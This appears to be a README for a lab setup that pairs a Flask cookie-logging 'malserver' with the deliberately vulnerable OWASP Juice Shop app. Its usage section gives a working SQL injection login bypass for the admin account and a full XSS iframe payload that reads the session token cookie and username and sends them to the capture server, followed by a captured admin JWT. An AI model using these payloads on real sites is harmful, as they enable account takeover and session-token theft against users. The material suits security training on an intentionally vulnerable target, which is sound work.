# Setting up Web Application Security Attack Infrastructure using Flask and Python with Juice Shop
The following guide assumes that you have Git and Docker installed already, as installation methods on different operating systems can vary greatly.

1. Clone this repository locally to your machine.
```
git clone <repo_url>
```

2. Change directories to the cloned repo folder.
```
cd malserver
```

3. Build the docker image and run a container using that image.
```
docker build -t malserver .
docker run -it --rm -v $(pwd):/malserver -p 5000:5000 malserver
```

4. Open your browser to http://localhost:5000/ and you should see the following response:
```
Did not receieve username and cookie params
```

5. Modify the url to include username and cookie params. For example, we will use username=Test1 and cookie=Test2, but these can be anything: http://localhost:5000/?username=Test1&cookie=Test2

6. Press enter after the params have been added to the url. You should the following reponse:
```
Received username=Test1 cookie=Test2
```

7. Check your project folder for a new file called **cookies.log** - this file will contain a log of all cookies that malserver receives.
Every time you run the server, it also logs the time at which the session was started. For example:
```
New Session Started: 2021-03-23 17:54:07.273424
Captured username=Test1 cookie=Test2
```

8. The next step is to run Juice Shop from Dockerhub.
```
docker run --rm -p 3000:3000 bkimminich/juice-shop
```

9. Open your browser to http://localhost:3000/#/ and you should see the Juice Shop web application.

10. Setup is now done. It is time to exploit an XSS vulnerable search field to send the username and cookie of a logged in user to our malicious server. 

# Usage Demonstration

1. First, we need to log in as a user. We will be exploiting a vulnerability on the login page to quickly and easily log in as the admin user account.
Navigate to http://localhost:3000/#/login and enter the following username with any random string as the password:
```
' OR 1=1--
```

2. You should have been redirected to the home page of Juice Shop again, but this time logged in as the admin user account.
Verify you are logged in by clicking the Account button on the top-right of the page.
If you logged in successfully, it should say **admin@juice-sh.op**.

3. Now we simply need to execute the following attack string in the XSS-vulnerable search field:
```
<iframe src='javascript:function getCookie(e){for(var t=e+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var r=n[o];" "==r.charAt(0);)r=r.substring(1);if(0==r.indexOf(t))return r.substring(t.length,r.length)}return""}var username = parent.document.querySelector(".menu-text.truncate").innerHTML.trim();var cookie = getCookie("token");document.write("<iframe src=" + `http://localhost:5000/?username=${username}&cookie=${cookie}` + "></iframe>");'>
```

4. You should see an iframe opened after **Search Results -** that contains a response from our malserver.
The response should resemble the following with a different, randomized cookie:
```
Received username=admin@juice-sh.op cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjEtMDMtMjMgMTg6Mjg6NTcuMDI2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjEtMDMtMjMgMTg6NDE6MzcuOTM5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTYxNjUyNTA4NSwiZXhwIjoxNjE2NTQzMDg1fQ.npFi78B2QDwBUIhmpBd9hVY6GNCu7DAcRluVhESnNBSD_9eVjdfQ4wV3XeP20tjUeEK9ox9xh4OPDvp5CeAG0ZYdTludK3Ify10TanbPoEi1K3RbvA4BQOSShP6cMc6MDh0fk6Of6VAwWohpcf9tqVWG5zEcFE4T-_wXkijBzu0
```